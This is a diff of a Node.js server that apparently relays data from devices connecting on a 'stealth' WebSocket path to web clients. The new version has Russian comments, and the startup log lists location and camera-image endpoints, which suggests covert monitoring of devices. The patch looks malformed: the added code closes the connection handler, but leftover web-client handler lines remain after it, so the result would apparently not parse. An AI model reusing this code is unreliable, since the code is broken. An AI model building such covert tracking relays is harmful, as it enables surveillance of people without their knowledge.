@@ -1,4 +1,3 @@
-// server.js
 import express from "express";
 import bodyParser from "body-parser";
 import cors from "cors";
@@ -81,71 +80,41 @@ function broadcastToWebClients(obj) {
 // Main connection handler
 wss.on("connection", (ws, req) => {
   const url = new URL(req.url, `http://${req.headers.host}`);
-  const pathname = url.pathname || "";
+  const pathname = url.pathname;
 
-  // Try query param first: /ws/live?deviceId=...
-  let deviceId = url.searchParams.get("deviceId") || null;
-
-  // Support legacy path: /ws/stealth/{deviceId}
-  if (!deviceId && pathname.startsWith("/ws/stealth")) {
-    const parts = pathname.split("/").filter(Boolean); // removes empty parts
-    deviceId = parts[parts.length - 1] || null;
+  // Получаем deviceId из query параметра ИЛИ из пути
+  let deviceId = url.searchParams.get("deviceId");
+  
+  // Если путь /ws/stealth/XXX - берём XXX как deviceId
+  if (!deviceId && pathname.startsWith("/ws/stealth/")) {
+    const parts = pathname.split("/");
+    deviceId = parts[parts.length - 1];
   }
 
-  // If path is /ws/live and no deviceId -> treat as web client
-  const isLivePath = pathname.startsWith("/ws/live") || pathname.startsWith("/ws/stealth") || pathname === "/ws/live";
-
-  if (!isLivePath) {
-    // Shouldn't happen because server.on('upgrade') filtered, but be safe:
-    ws.close(1008, "Unsupported WebSocket path");
-    return;
-  }
-
-  if (deviceId) {
-    // --- Device connection ---
+  if (deviceId && deviceId !== "live") {
+    // === УСТРОЙСТВО ===
     ws.deviceId = deviceId;
     stealthConnections.set(deviceId, { ws, lastSeen: Date.now() });
-    console.log(`Device ${deviceId} connected via WS (path ${pathname})`);
+    console.log(`Device ${deviceId} connected`);
 
     ws.on("message", (rawData) => {
       try {
-        // rawData may be string or Buffer
-        if (typeof rawData === "string") {
-          // assume JSON
-          const msg = JSON.parse(rawData);
-          const type = msg.type || "message";
-          const data = msg.data ?? null;
-          const timestamp = msg.timestamp ?? Date.now();
-
-          // Build broadcast payload
-          const broadcast = {
-            type,
-            deviceId,
-            data,
-            timestamp,
-            meta: msg.meta ?? null
-          };
-
-          // If device explicitly sends image/audio as base64 inside msg.data, it's forwarded
-          broadcastToWebClients(broadcast);
-          console.log(`Broadcasted ${type} from ${deviceId} to ${webClients.size} web clients`);
-        } else if (Buffer.isBuffer(rawData)) {
-          // Binary frame received — convert to base64 and forward as JSON with encoding hint
-          const b64 = rawData.toString("base64");
-          const broadcast = {
-            type: "binary",
-            encoding: "base64",
-            deviceId,
-            data: b64,
-            timestamp: Date.now()
-          };
-          broadcastToWebClients(broadcast);
-          console.log(`Broadcasted binary frame from ${deviceId} as base64 to ${webClients.size} web clients`);
-        } else {
-          console.warn("Unknown message type from device:", typeof rawData);
-        }
+        const dataStr = rawData.toString();
+        const msg = JSON.parse(dataStr);
+        
+        // Пересылаем всё веб-клиентам
+        const broadcast = {
+          type: msg.type || "message",
+          deviceId: deviceId,
+          data: msg.data,
+          timestamp: msg.timestamp || Date.now()
+        };
+        
+        broadcastToWebClients(broadcast);
+        console.log(`Message from ${deviceId}: ${msg.type}`);
+        
       } catch (err) {
-        console.error("Error processing device message:", err);
+        console.error(`Error from device ${deviceId}:`, err);
       }
     });
 
@@ -154,14 +123,17 @@ wss.on("connection", (ws, req) => {
       console.log(`Device ${deviceId} disconnected`);
     });
 
-    ws.on("error", (err) => {
-      console.error(`Device WebSocket error (${deviceId}):`, err);
-    });
-
   } else {
-    // --- Web client connection ---
+    // === ВЕБ-КЛИЕНТ ===
     webClients.add(ws);
-    console.log(`Web client connected. Total web clients: ${webClients.size}`);
+    console.log(`Web client connected. Total: ${webClients.size}`);
+
+    ws.on("close", () => {
+      webClients.delete(ws);
+      console.log(`Web client disconnected. Total: ${webClients.size}`);
+    });
+  }
+});
 
     ws.on("message", (msg) => {
       // Optionally handle web-client messages (e.g., requesting actions)
@@ -498,4 +470,5 @@ server.listen(PORT, () => {
   console.log("- Legacy devices path: ws://host/ws/stealth/SYS123");
   console.log("Available endpoints: /api/login, /api/location, /api/camera/image, /api/devices/:token, etc.");
 });
+
 
